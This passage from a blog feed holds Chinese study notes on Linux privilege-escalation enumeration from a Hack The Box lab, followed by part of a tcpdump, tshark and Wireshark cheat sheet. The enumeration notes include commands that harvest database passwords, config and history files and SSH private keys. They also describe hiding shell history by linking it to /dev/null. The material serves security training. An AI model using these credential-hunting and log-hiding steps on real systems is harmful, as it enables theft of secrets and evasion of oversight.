0</code></pre><p>许多文件夹和文件在Linux系统中被隐藏，因此它们不明显，并且可以防止意外编辑。为什么这些文件和文件夹被隐藏起来，原因比迄今为止提到的要多得多。尽管如此，我们需要能够找到所有隐藏的文件和文件夹，因为它们通常包含敏感信息，即使我们拥有只读权限。</p><h4 id="All-Hidden-Files"><a href="#All-Hidden-Files" class="headerlink" title="All Hidden Files"></a>All Hidden Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ find / -type f -name &quot;.*&quot; -exec ls -l &#123;&#125; \; 2&gt;/dev/null | grep htb-student-rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc-rw-rw-r-- 1 htb-student htb-student 180 Nov 27 11:36 /home/htb-student/.wget-hsts-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history</code></pre><blockquote><ul><li><code>&#123;&#125;</code> 表示 <code>find</code> 命令的占位符，用于表示找到的文件。</li><li><code>\;</code> 是 <code>find</code> 命令的结束符号，表示命令结束。</li></ul><p>通过这个命令，<code>find</code> 命令将在当前目录或指定的目录下查找满足条件的文件，并将每个文件的详细信息传递给 <code>ls -l</code> 命令进行输出。</p><p>需要注意的是，这个命令在每找到一个文件时都会执行一次 <code>ls -l</code> 命令，可能会产生大量的输出。如果您只想查看文件的总体信息，可以使用 <code>ls -l</code> 命令来替代。</p></blockquote><p>此外，三个默认文件夹用于临时文件。这些文件夹对所有用户都可见，并且可以读取。此外，可以在那里找到临时日志或脚本输出。&#x2F;tmp和&#x2F;var&#x2F;tmp都用于临时存储数据。然而，关键的区别在于数据在这些文件系统中存储的时间。&#x2F;var&#x2F;tmp的数据保留时间要比&#x2F;tmp目录的数据保持时间长得多。默认情况下，存储在&#x2F;var&#x2F;tmp中的所有文件和数据最多保留30天。另一方面，在&#x2F;tmp中，数据会在十天后自动删除。 此外，当系统重新启动时，存储在&#x2F;tmp目录中的所有临时文件都会立即删除。因此，程序使用&#x2F;var&#x2F;tmp目录来存储在重新启动之间必须临时保存的数据。</p><h4 id="Temporary-Files"><a href="#Temporary-Files" class="headerlink" title="Temporary Files"></a>Temporary Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -l /tmp /var/tmp /dev/shm</code></pre><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer.</p></blockquote><p>在查找时发现一个有趣的东西记录一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151702324.png" alt="image-20230715170245465">他把历史记录的文件直接软连接到null中，这样就可以不记录我们的操作。</p><blockquote><p>该输出显示了一个名为 <code>.bash_history</code> 的符号链接文件。下面是对该输出的解释：</p><ul><li><code>lrwxrwxrwx</code>：表示该文件是一个符号链接（即软链接）。第一个字符 <code>l</code> 表示文件类型为符号链接。</li><li><code>1</code>：表示链接计数，即有多少个文件名链接到同一个 inode（索引节点）。</li><li><code>root</code>：表示文件的所有者是 root 用户。</li><li><code>root</code>：表示文件的所属组是 root 组。</li><li><code>9 Jun 14 14:38</code>：表示文件的最后修改时间为 6 月 14 日的 14:38。</li><li><code>.bash_history -&gt; /dev/null</code>：表示 <code>.bash_history</code> 是一个指向 <code>/dev/null</code> 的符号链接。</li></ul><p>符号链接（或软链接）是一种特殊的文件类型，它创建了一个指向另一个文件或目录的引用。在这种情况下，<code>.bash_history</code> 是一个指向 <code>/dev/null</code> 的符号链接。<code>/dev/null</code> 是一个特殊的设备文件，它被用于丢弃所有写入它的数据，即将数据发送到空虚。</p><p>这种设置可能意味着用户的 Bash 历史记录文件被重定向到 <code>/dev/null</code>，这意味着 Bash 历史记录中的所有命令都将被丢弃，不会被保留下来。</p></blockquote><blockquote><p>要创建符号链接（软链接），可以使用 <code>ln</code> 命令。<code>ln</code> 命令用于创建链接，它可以创建硬链接或符号链接。在这种情况下，我们想要创建一个符号链接。</p><p>下面是使用 <code>ln</code> 命令创建符号链接的语法：</p><pre><code class="shell">ln -s &lt;目标文件&gt; &lt;链接名称&gt;</code></pre><p>其中：</p><ul><li><code>&lt;目标文件&gt;</code> 是指向的目标文件或目录的路径。</li><li><code>&lt;链接名称&gt;</code> 是要创建的符号链接的名称和路径。</li></ul><p>例如，要创建一个名为 <code>.bash_history</code> 的符号链接指向 <code>/dev/null</code>，可以使用以下命令：</p><pre><code class="shell">ln -s /dev/null .bash_history</code></pre><p>执行此命令后，将在当前目录中创建一个名为 <code>.bash_history</code> 的符号链接，它将指向 <code>/dev/null</code>。这样，当您的系统尝试将 Bash 历史记录写入 <code>.bash_history</code> 文件时，数据实际上会被重定向到 <code>/dev/null</code>，即被丢弃。</p><p>请注意，在创建符号链接时，确保您具有适当的权限来访问目标文件或目录，并且在目标文件或目录存在的情况下才能成功创建链接。</p></blockquote><h1 id="Linux-Services-amp-Internals-Enumeration"><a href="#Linux-Services-amp-Internals-Enumeration" class="headerlink" title="Linux Services &amp; Internals Enumeration"></a>Linux Services &amp; Internals Enumeration</h1><h2 id="Internals"><a href="#Internals" class="headerlink" title="Internals"></a>Internals</h2><p>当我们谈论内部时，我们指的是内部配置和工作方式，包括为完成特定任务而设计的集成流程。因此，我们从我们的目标系统可以通信的接口开始。</p><h4 id="Network-Interfaces"><a href="#Network-Interfaces" class="headerlink" title="Network Interfaces"></a>Network Interfaces</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ip a</code></pre><p>&#x2F;etc&#x2F;hosts文件中有什么有趣的内容吗？</p><p>查看每个用户的上次登录时间也很有帮助，以了解用户通常何时登录系统以及登录频率。这可以让我们了解这个系统的使用范围，这可能会导致更多的错误配置或“混乱”的目录或命令历史记录。</p><h4 id="User’s-Last-Login"><a href="#User’s-Last-Login" class="headerlink" title="User’s Last Login"></a>User’s Last Login</h4><pre><code class="shell-session">Tanin@htb[/htb]$ lastlog</code></pre><p>此外，让我们看看目前是否有其他人与我们一起使用该系统。有几种方法可以做到这一点，例如who命令。finger命令将在某些Linux系统上显示此信息。我们可以看到cliff.moore用户已经和我们一起登录到了系统。</p><h4 id="Logged-In-Users"><a href="#Logged-In-Users" class="headerlink" title="Logged In Users"></a>Logged In Users</h4><pre><code class="shell-session">Tanin@htb[/htb]$ w 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATcliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash</code></pre><p>检查用户的bash历史记录也很重要，因为他们可能会在命令行上将密码作为参数传递，使用git存储库，设置cron作业等等。查看用户所做的事情可以让您深入了解所登录的服务器类型，并提示权限提升路径。</p><h4 id="Command-History"><a href="#Command-History" class="headerlink" title="Command History"></a>Command History</h4><pre><code class="shell-session">Tanin@htb[/htb]$ history    1  id    2  cd /home/cliff.moore    3  exit    4  touch backup.sh    5  tail /var/log/apache2/error.log    6  ssh ec2-user@dmz02.inlanefreight.local    7  history</code></pre><p>有时我们还可以找到由脚本或程序创建的特殊历史文件。这可以在监视用户的某些活动并检查可疑活动的脚本中找到。</p><h4 id="Finding-History-Files"><a href="#Finding-History-Files" class="headerlink" title="Finding History Files"></a>Finding History Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l &#123;&#125; \; 2&gt;/dev/null-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history</code></pre><p>检查系统上的任何cron作业也是一个好主意。Linux系统上的Cron作业类似于Windows计划任务。它们通常用于执行维护和备份任务。结合其他错误配置（如相对路径或弱权限），它们可以在计划的cron作业运行时利用这些错误配置来提升权限。</p><h4 id="Cron"><a href="#Cron" class="headerlink" title="Cron"></a>Cron</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /etc/cron.daily/</code></pre><p>proc文件系统 <a href="https://man7.org/linux/man-pages/man5/proc.5.html">proc filesystem</a> （proc&#x2F;procfs）是Linux中的一个特定文件系统，它包含有关系统进程、硬件和其他系统信息的信息。它是访问进程信息的主要方式，可用于查看和修改内核设置。它是虚拟的，不作为真实的文件系统存在，而是由内核动态生成的。它可以用来查找系统信息，例如运行进程的状态、内核参数、系统内存和设备。它还设置某些系统参数，例如进程优先级、调度和内存分配。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find /proc -name cmdline -exec cat &#123;&#125; \; 2&gt;/dev/null | tr &quot; &quot; &quot;\n&quot;...SNIP...startups/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitdroot@10.129.14.200sshroot@10.129.14.200sshd:htb-student[priv]sshd:htb-student[priv]/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.ssh/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.sshsshd:htb-student@pts/2sshd:</code></pre><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><p>如果是稍旧的Linux系统，我们可能会发现安装的软件包中至少有一个漏洞。然而，当前版本的Linux发行版也可能安装了可能存在此类漏洞的旧包或软件。因此，我们将看到一种方法来帮助我们检测潜在的危险包裹。要做到这一点，我们首先需要创建一个要使用的已安装包的列表。</p><h4 id="Installed-Packages"><a href="#Installed-Packages" class="headerlink" title="Installed Packages"></a>Installed Packages</h4><pre><code class="shell-session">Tanin@htb[/htb]$ apt list --installed | tr &quot;/&quot; &quot; &quot; | cut -d&quot; &quot; -f1,3 | sed &#39;s/[0-9]://g&#39; | tee -a installed_pkgs.listListing...                                                 accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                                                          accountsservice 0.6.55-0ubuntu12~20.04.5                   acl 2.2.53-6                                               acpi-support 0.143                                         acpid 2.0.32-1ubuntu1                                      adduser 3.118ubuntu2                                       adwaita-icon-theme 3.36.1-2ubuntu0.20.04.2                 alsa-base 1.0.25+dfsg-0ubuntu5                             alsa-topology-conf 1.2.2-1                                                                                            alsa-ucm-conf 1.2.2-1ubuntu0.13                            alsa-utils 1.2.2-1ubuntu2.1                                                                                           amd64-microcode 3.20191218.1ubuntu1anacron 2.3-29apg 2.2.3.dfsg.1-5app-install-data-partner 19.04apparmor 2.13.3-7ubuntu5.1apport-gtk 2.20.11-0ubuntu27.24apport-symptoms 0.23apport 2.20.11-0ubuntu27.24appstream 0.12.10-2apt-config-icons-hidpi 0.12.10-2apt-config-icons 0.12.10-2apt-utils 2.0.9...SNIP...</code></pre><p>检查系统上安装的sudo版本是否容易受到任何遗留或最近的漏洞攻击也是一个好主意。</p><h4 id="Sudo-Version"><a href="#Sudo-Version" class="headerlink" title="Sudo Version"></a>Sudo Version</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo -V</code></pre><p>偶尔也会发生这样的情况：系统上没有安装直接包，而是以二进制文件的形式编译程序。这些不需要安装，并且可以由系统本身直接执行。</p><h4 id="Binaries"><a href="#Binaries" class="headerlink" title="Binaries"></a>Binaries</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -l /bin /usr/bin/ /usr/sbin/lrwxrwxrwx 1 root root     7 Oct 27 11:14 /bin -&gt; usr/bin/usr/bin/:total 175160-rwxr-xr-x 1 root root       31248 May 19  2020  aa-enabled-rwxr-xr-x 1 root root       35344 May 19  2020  aa-exec-rwxr-xr-x 1 root root       22912 Apr 14  2021  aconnect-rwxr-xr-x 1 root root       19016 Nov 28  2019  acpi_listen-rwxr-xr-x 1 root root        7415 Oct 26  2021  add-apt-repository-rwxr-xr-x 1 root root       30952 Feb  7  2022  addpartlrwxrwxrwx 1 root root          26 Oct 20  2021  addr2line -&gt; x86_64-linux-gnu-addr2line...SNIP...</code></pre><p><a href="https://gtfobins.github.io/">GTFObins</a>提供了一个优秀的平台，其中包括一系列二进制文件，这些二进制文件可能被用来提升我们在目标系统上的权限。对于下一个oneliner，我们可以将现有的二进制文件与GTFObins中的二进制文件进行比较，以了解我们稍后应该研究哪些二进制文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d&quot; &quot; -f1 | sed &#39;/^[[:space:]]*$/d&#39;);do if grep -q &quot;$i&quot; installed_pkgs.list;then echo &quot;Check GTFO for: $i&quot;;fi;doneCheck GTFO for: ab                                         Check GTFO for: apt                                        Check GTFO for: ar                                         Check GTFO for: as         Check GTFO for: ash                                        Check GTFO for: aspell                                     Check GTFO for: at     Check GTFO for: awk      Check GTFO for: bash                                       Check GTFO for: bridgeCheck GTFO for: busyboxCheck GTFO for: bzip2Check GTFO for: catCheck GTFO for: commCheck GTFO for: cpCheck GTFO for: cpioCheck GTFO for: cupsfilterCheck GTFO for: curlCheck GTFO for: dashCheck GTFO for: dateCheck GTFO for: ddCheck GTFO for: diff</code></pre><p>我们可以在基于Linux的操作系统上使用诊断工具strace来跟踪和分析系统调用和信号处理。它使我们能够遵循程序的流程，了解程序如何访问系统资源、处理信号以及从操作系统接收和发送数据。此外，我们还可以使用该工具来监控与安全相关的活动，并识别潜在的攻击载体，例如使用密码或令牌向远程主机发出的特定请求。 strace的输出可以写入一个文件以供以后分析，它提供了丰富的选项，可以详细监控程序的行为。</p><pre><code class="shell-session">Tanin@htb[/htb]$ strace ping -c1 10.129.112.20</code></pre><p>如果管理员保持Linux操作系统上几乎所有的配置文件不变，则用户可以读取这些文件。这些配置文件通常可以揭示服务是如何设置和配置的，以便更好地了解我们如何将其用于我们的目的。此外，这些文件可能包含敏感信息，例如我们看不到的文件夹中文件的密钥和路径。但是，如果该文件对每个人都具有读取权限，即使我们没有读取文件夹的权限，我们仍然可以读取该文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l &#123;&#125; \; 2&gt;/dev/null-rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf-rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf-rw-r--r-- 1 root root 72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf-rw-r--r-- 1 root root 0 Nov 28 12:37 /run/NetworkManager/conf.d/10-globally-managed-devices.conf-rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf-rw-r--r-- 1 systemd-resolve systemd-resolve 607 Nov 28 12:31 /run/systemd/resolve/resolv.conf...SNIP...</code></pre><p>脚本与配置文件类似。管理员往往懒惰，对网络安全深信不疑，忽视了系统的内部安全。在某些情况下，这些脚本具有错误的特权，我们稍后将对此进行处理，但即使没有这些特权，内容也非常重要。因为通过它们，我们可以发现对我们非常有用的内部和个人过程。</p><h4 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h4><pre><code class="shell-session">Tanin@htb[/htb]$ find / -type f -name &quot;*.sh&quot; 2&gt;/dev/null | grep -v &quot;src\|snap\|share&quot;/home/htb-student/automation.sh/etc/wpa_supplicant/action_wpa.sh/etc/wpa_supplicant/ifupdown.sh/etc/wpa_supplicant/functions.sh/etc/init.d/keyboard-setup.sh/etc/init.d/console-setup.sh/etc/init.d/hwclock.sh...SNIP...</code></pre><p>此外，如果我们查看进程列表，它可以为我们提供有关哪些脚本或二进制文件正在使用以及由哪个用户使用的信息。因此，例如，如果它是管理员在其路径中创建的脚本，并且其权限没有受到限制，我们可以在不进入根目录的情况下运行它。</p><h4 id="Running-Services-by-User"><a href="#Running-Services-by-User" class="headerlink" title="Running Services by User"></a>Running Services by User</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ps aux | grep root...SNIP...</code></pre><h1 id="Credential-Hunting"><a href="#Credential-Hunting" class="headerlink" title="Credential Hunting"></a>Credential Hunting</h1><p>枚举系统时，记下任何凭据都很重要。这些可以在配置文件（.conf、.config、.xml等）、shell脚本、用户的bash历史文件、备份（.bak）文件、数据库文件甚至文本文件中找到。凭据可能有助于升级到其他用户，甚至root用户，访问环境中的数据库和其他系统。 &#x2F;var&#x2F;目录通常包含主机上运行的任何web服务器的web根目录。web根可以包含数据库凭证或可以用于进一步访问的其他类型的凭证。一个常见的例子是WordPress配置文件中的MySQL数据库凭据：</p><pre><code class="shell-session">htb_student@NIX02:~$ cat wp-config.php | grep &#39;DB_USER\|DB_PASSWORD&#39;define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );define( &#39;DB_PASSWORD&#39;, &#39;WPadmin123!&#39; );</code></pre><p>spool 或 mail 目录（如果可以访问）也可能包含有价值的信息甚至凭据。通常可以在web根目录中找到存储在文件中的凭据（即MySQL连接字符串、WordPress配置文件）。</p><pre><code class="shell-session">htb_student@NIX02:~$  find / ! -path &quot;*/proc/*&quot; -iname &quot;*config*&quot; -type f 2&gt;/dev/null</code></pre><p><code>-iname &quot;*config*&quot;</code>：表示忽略文件名大小写，查找包含 “config” 的文件。</p><h2 id="SSH-Keys"><a href="#SSH-Keys" class="headerlink" title="SSH Keys"></a>SSH Keys</h2><p>在系统中搜索可访问的SSH私钥也很有用。我们可能会为另一个更有特权的用户找到一个私钥，我们可以使用该私钥以额外的特权连接回盒子。我们有时还可能找到可以用于访问环境中其他主机的SSH密钥。每当找到SSH密钥时，请检查known_hosts文件以查找目标。此文件包含用户过去连接过的所有主机的公钥列表，可能有助于横向移动或在远程主机上查找可用于对我们的目标执行权限提升的数据。</p><pre><code class="shell-session">htb_student@NIX02:~$  ls ~/.sshid_rsa  id_rsa.pub  known_hosts</code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Environment-Enumeration&quot;&gt;&lt;a href=&quot;#Environment-Enumeration&quot; class=&quot;headerlink&quot; title=&quot;Environment Enumeration&quot;&gt;&lt;/a&gt;Environment Enumeration&lt;/h1&gt;&lt;p&gt;Linux系统上的根帐户提供对操作系统的完全管理级别访问。在评估过程中，您可能会在Linux主机上获得一个低特权shell，并且需要向根帐户执行权限提升。完全损害主机将使我们能够捕获流量并访问敏感文件，这些文件可能用于在环境中进一步访问。此外，如果Linux计算机已加入域，我们可以获得NTLM哈希并开始枚举和攻击Active Directory。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>NTA</title>
    <link href="https://taninluv.github.io/2023/07/15/NTA/"/>
    <id>https://taninluv.github.io/2023/07/15/NTA/</id>
    <published>2023-07-15T04:07:33.000Z</published>
    <updated>2023-07-15T07:00:50.371Z</updated>
    
    <content type="html"><![CDATA[<p>网络流量分析（NTA）可以被描述为检查网络流量的行为，以表征所使用的公共端口和协议，为我们的环境建立基线，监控和应对威胁，并确保对我们组织的网络有最大可能的了解。</p><span id="more"></span><h1 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h1><p>请记住，除非您使用 root，否则执行任何需要绑定网络接口或将其设置为混杂模式的应用程序都需要权限。<code>sudo</code></p><h2 id="无机连接信息"><a href="#无机连接信息" class="headerlink" title="无机连接信息"></a>无机连接信息</h2><ul><li>目标 IP &#x3D;&#x3D; 10.129.43.4</li></ul><h2 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>tcpdump --version</code></td><td>打印 tcpdump 和 libpcap 版本字符串，然后退出。</td></tr><tr><td><code>tcpdump -h</code></td><td>打印帮助和使用信息。</td></tr><tr><td><code>tcpdump -D</code></td><td>打印 tcpdump 可以从中捕获的可用网络接口的列表。</td></tr><tr><td><code>tcpdump -i (interface name or #)</code></td><td>执行 tcpdump 并利用指定的要捕获的接口。</td></tr><tr><td><code>tcpdump -i (int) -w file.pcap</code></td><td>在指定的接口上运行捕获并将输出写入文件。</td></tr><tr><td><code>tcpdump -r file.pcap</code></td><td>TCPDump 将从指定的文件中读取输出。</td></tr><tr><td><code>tcpdump -r/-w file.pcap -l | grep &#39;string&#39;</code></td><td>TCPDump 将利用来自实时捕获或文件的捕获流量，并将标准输出设置为行缓冲。然后，我们可以利用管道 （|） 将该输出发送到其他工具（如 grep）以查找字符串或特定模式。</td></tr><tr><td><code>tcpdump -i (int) host (ip)</code></td><td>TCPDump 将在 （int） 指定的接口上启动捕获，并且仅捕获源自或发往 之后指定的 IP 地址或主机名的流量。<code>host</code></td></tr><tr><td><code>tcpdump -i (int) port (#)</code></td><td>将筛选捕获中来自或发往端口 （#） 的任何内容，并丢弃其余内容。</td></tr><tr><td><code>tcpdump -i (int) proto (#)</code></td><td>将筛选捕获以查找与 （#） 匹配的任何协议流量。例如，（6） 将过滤任何 TCP 流量并丢弃其余流量。</td></tr><tr><td><code>tcpdump -i (int) (proto name)</code></td><td>将利用协议公用名来过滤捕获的流量。以TCP&#x2F;UDP&#x2F;ICMP为例。</td></tr></tbody></table><hr><h2 id="Tcpdump-通用开关和过滤器"><a href="#Tcpdump-通用开关和过滤器" class="headerlink" title="Tcpdump 通用开关和过滤器"></a>Tcpdump 通用开关和过滤器</h2><table><thead><tr><th><strong>开关&#x2F;滤波器</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>D</code></td><td>将显示可从中捕获的任何接口。</td></tr><tr><td><code>i</code></td><td>选择要从中捕获的接口。例如 -i eth0</td></tr><tr><td><code>n</code></td><td>不要解析主机名。</td></tr><tr><td><code>nn</code></td><td>不要解析主机名或已知端口。</td></tr><tr><td><code>e</code></td><td>将获取以太网标头以及上层数据。</td></tr><tr><td><code>X</code></td><td>以十六进制和 ASCII 显示数据包的内容。</td></tr><tr><td><code>XX</code></td><td>与 X 相同，但也会指定以太网标头。（如使用 Xe）</td></tr><tr><td><code>v, vv, vvv</code></td><td>增加显示和保存的输出的详细程度。</td></tr><tr><td><code>c</code></td><td>获取特定数量的数据包，然后退出程序。</td></tr><tr><td><code>s</code></td><td>定义要抓取的数据包量。</td></tr><tr><td><code>S</code></td><td>将捕获显示中的相对序列号更改为绝对序列号。（13248765839而不是 101）</td></tr><tr><td><code>q</code></td><td>打印更少的协议信息。</td></tr><tr><td><code>r file.pcap</code></td><td>从文件中读取。</td></tr><tr><td><code>w file.pcap</code></td><td>写入文件</td></tr><tr><td><code>host</code></td><td>主机将过滤可见流量以显示涉及指定主机的任何内容。双向</td></tr><tr><td><code>src / dest</code></td><td><code>src</code>并且是修饰符。我们可以使用它们来指定源或目标主机或端口。<code>dest</code></td></tr><tr><td><code>net</code></td><td><code>net</code>将向我们显示来自或发往指定网络的任何流量。它使用&#x2F;符号。</td></tr><tr><td><code>proto</code></td><td>将筛选特定的协议类型。（以ether，TCP，UDP和ICMP为例）</td></tr><tr><td><code>port</code></td><td><code>port</code>是双向的。它将显示将指定端口作为源或目标的任何流量。</td></tr><tr><td><code>portrange</code></td><td><code>Portrange</code>允许我们指定端口范围。(0-1024)</td></tr><tr><td><code>less / greater &quot;&lt; &gt;&quot;</code></td><td><code>less</code>并可用于查找特定大小的数据包或协议选项。<code>greater</code></td></tr><tr><td><code>and / &amp;&amp;</code></td><td><code>and</code> <code>&amp;&amp;</code>可用于将两个不同的筛选器连接在一起。例如，SRC 主机和端口。</td></tr><tr><td><code>or</code></td><td><code>or</code>或者允许在两个条件中的任何一个上进行匹配。它不必同时满足两者。这可能很棘手。</td></tr><tr><td><code>not</code></td><td><code>not</code>是一个修饰符，表示除 x 以外的任何内容。例如，不是 UDP。</td></tr></tbody></table><hr><h2 id="沙克"><a href="#沙克" class="headerlink" title="沙克"></a>沙克</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>tshark -h</code></td><td>打印帮助菜单。</td></tr><tr><td><code>tshark -D</code></td><td>列出要从中捕获的可用接口。</td></tr><tr><td><code>tshark -i (int)</code></td><td>在所选接口上捕获。将 （int） 替换为接口名称或编号。</td></tr><tr><td><code>tshark -i eth0 -f &quot;host (ip)&quot;</code></td><td>使用 tshark 时应用带有 （-f） 的过滤器以查找特定主机</td></tr><tr><td><code>D</code></td><td>将显示可从中捕获然后退出的任何接口。</td></tr><tr><td><code>L</code></td><td>将列出您可以从中捕获然后退出的链接层介质。（以以太网为例）</td></tr><tr><td><code>i</code></td><td>选择要从中捕获的接口。（-i eth0）</td></tr><tr><td><code>f</code></td><td>libpcap 语法中的数据包过滤器。在捕获期间使用。</td></tr><tr><td><code>c</code></td><td>获取特定数量的数据包，然后退出程序。定义停止条件。</td></tr><tr><td><code>a</code></td><td>定义自动停止条件。它可以是在持续时间、特定文件大小或一定数量的数据包之后。</td></tr><tr><td><code>r (pcap-file)</code></td><td>从文件中读取。</td></tr><tr><td><code>W (pcap-file)</code></td><td>使用 pcapng 格式写入文件。</td></tr><tr><td><code>P</code></td><td>写入文件时将打印数据包摘要 （-W）</td></tr><tr><td><code>x</code></td><td>会将十六进制和 ASCII 输出添加到捕获中。</td></tr><tr><td><code>h</code></td><td>查看帮助菜单</td></tr></tbody></table><hr><h2 id="线鲨"><a href="#线鲨" class="headerlink" title="线鲨"></a>线鲨</h2><table><thead><tr><th><strong>捕获筛选器</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>host x.x.x.x</code></td><td>仅捕获与特定主机相关的流量</td></tr><tr><td><code>net x.x.x.x/24</code></td><td>捕获进出特定网络的流量（使用斜杠表示法指定掩码）</td></tr><tr><td><code>src/dst net x.x.x.x/24</code></td><td>使用 src 或 dst 网络将仅捕获来自指定网络或发往目标网络的流量来源</td></tr><tr><td><code>port #</code></td><td>将过滤掉除您指定的端口之外的所有流量</td></tr><tr><td><code>not</code></td><td>将捕获除指定变量之外的所有内容。前任。<code>not port 80</code></td></tr><tr><td><code>and</code></td><td>AND 将连接您指定的端口。前任。<code>host 192.168.1.1 and port 80</code></td></tr><tr><td><code>portrange x-x</code></td><td>端口范围将仅从范围内的所有端口获取流量</td></tr><tr><td><code>ip / ether / tcp</code></td><td>这些过滤器将仅从指定的协议标头中获取流量。</td></tr><tr><td><code>broadcast / multicast / unicast</code></td><td>获取特定类型的流量。一对一、一对多或一对全部。</td></tr></tbody></table><table><thead><tr><th><strong>显示筛选器</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>ip.addr == x.x.x.x</code></td><td>仅捕获与特定主机相关的流量。这是一个 OR 语句。</td></tr><tr><td><code>ip.addr == x.x.x.x/24</code></td><td>捕获与特定网络相关的流量。这是一个 OR 语句。</td></tr><tr><td><code>ip.src/dst == x.x.x.x</code></td><td>捕获进出特定主机的流量。</td></tr><tr><td><code>dns / tcp / ftp / arp / ip</code></td><td>按特定协议过滤流量。还有更多选择。</td></tr><tr><td><code>tcp.port == x</code></td><td>按特定 TCP 端口进行筛选。</td></tr><tr><td><code>src.port / dst.port ==x</code></td><td>将捕获除指定端口之外的所有内容。</td></tr><tr><td><code>and / or / not</code></td><td>AND 将连接，OR 将找到两个选项中的任何一个，NOT 将排除您的输入选项。</td></tr><tr><td><code>tcp.stream eq #</code></td><td>允许我们跟踪捕获整个流的 tcp 会话。将 （#） 替换为要重新组合的会话。</td></tr><tr><td><code>http</code></td><td>将过滤与 http 协议匹配的任何流量。</td></tr><tr><td><code>http &amp;&amp; image-jfif</code></td><td>此过滤器将显示带有 jpeg 图像文件的任何数据包。</td></tr><tr><td><code>ftp</code></td><td>FTP 协议的筛选器。</td></tr><tr><td><code>ftp.request.command</code></td><td>将过滤通过 ftp 控制通道发送的任何控制命令。</td></tr><tr><td><code>ftp-data</code></td><td>将显示通过 ftp 传输的任何对象。</td></tr></tbody></table><hr><h2 id="杂项命令"><a href="#杂项命令" class="headerlink" title="杂项命令"></a>杂项命令</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>sudo *</code></td><td>Sudo 将运行以提升的权限继续执行的命令。</td></tr><tr><td><code>which (application)</code></td><td>利用 来确定主机上是否安装了（应用程序）。将应用程序替换为您要查找的内容。前任。<code>which tcpdump</code></td></tr><tr><td><code>sudo apt install (application)</code></td><td>使用提升的权限安装应用程序包（如果主机上不存在应用程序包）。前任。<code>sudo apt install wireshark</code></td></tr><tr><td><code>man (application)</code></td><td>显示应用程序的手册页。前任。。<code>man tcpdump</code></td></tr></tbody></table><h4 id="Common-Traffic-Analysis-Tools"><a href="#Common-Traffic-Analysis-Tools" class="headerlink" title="Common Traffic Analysis Tools"></a>Common Traffic Analysis Tools</h4><table><thead><tr><th><strong>Tool</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>tcpdump</code></td><td><a href="https://www.tcpdump.org/">tcpdump</a> is a command-line utility that, with the aid of LibPcap, captures and interprets network traffic from a network interface or capture file.</td></tr><tr><td><code>Tshark</code></td><td><a href="https://www.wireshark.org/docs/man-pages/tshark.html">TShark</a> is a network packet analyzer much like TCPDump. It will capture packets from a live network or read and decode from a file. It is the command-line variant of Wireshark.</td></tr><tr><td><code>Wireshark</code></td><td><a href="https://www.wireshark.org/">Wireshark</a> is a graphical network traffic analyzer. It captures and decodes frames off the wire and allows for an in-depth look into the environment. It can run many different dissectors against the traffic to characterize the protocols and applications and provide insight into what is happening.</td></tr><tr><td><code>NGrep</code></td><td><a href="https://github.com/jpr5/ngrep">NGrep</a> is a pattern-matching tool built to serve a similar function as grep for Linux distributions. The big difference is that it works with network traffic packets. NGrep understands how to read live traffic or traffic from a PCAP file and utilize regex expressions and BPF syntax. This tool shines best when used to debug traffic from protocols like HTTP and FTP.</td></tr><tr><td><code>tcpick</code></td><td><a href="http://tcpick.sourceforge.net/index.php?p=home.inc">tcpick</a> is a command-line packet sniffer that specializes in tracking and reassembling TCP streams. The functionality to read a stream and reassemble it back to a file with tcpick is excellent.</td></tr><tr><td><code>Network 